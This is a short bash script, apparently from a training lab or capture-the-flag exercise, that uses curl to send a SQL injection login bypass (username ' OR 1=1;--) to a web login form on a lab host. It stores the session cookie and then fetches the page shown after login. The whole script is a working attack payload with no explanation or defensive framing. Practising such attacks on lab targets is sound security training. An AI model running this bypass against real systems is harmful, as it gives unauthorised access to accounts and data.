#!/bin/bash
B="http://chatelaine.cylabacademy.net:25024"
echo "=== login ' OR 1=1;-- ==="
curl -s -m 20 -c /tmp/cj2.txt -i --data-urlencode "username=' OR 1=1;--" --data-urlencode "password=x" "$B/" | head -25
echo
echo "=== suite (page apres login) ==="
curl -s -m 20 -b /tmp/cj2.txt "$B/" | head -40
